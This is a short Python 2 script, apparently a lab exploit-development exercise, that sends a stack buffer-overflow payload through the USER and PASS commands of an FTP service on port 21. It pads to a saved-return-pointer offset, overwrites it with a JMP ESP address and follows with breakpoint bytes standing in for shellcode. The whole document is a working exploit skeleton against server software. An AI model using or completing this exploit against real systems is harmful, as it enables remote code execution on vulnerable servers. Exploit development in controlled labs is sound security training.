#!/usr/bin/env python2
import socket
import struct

# set up the IP and port we're connecting to
RHOST = "10.0.2.8"
RPORT = 21

buf_totlen = 2500
offset_srp = 2007

ptr_jmp_esp = 0x7c9d30d7

# build a message followed by a newline
buf = ""
buf += "A"*(offset_srp - len(buf))
buf += struct.pack("<I", ptr_jmp_esp)
buf += "BBBB"
buf += "\xCC\xCC\xCC\xCC"
buf += "D"*(buf_totlen - len(buf))

# send the message
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((RHOST, RPORT))
s.recv(1024)
s.send('USER ' + buf + '\r\n')
s.recv(1024)
s.send('PASS ' + buf + '\r\n')
s.send('QUIT\r\n')
s.close()
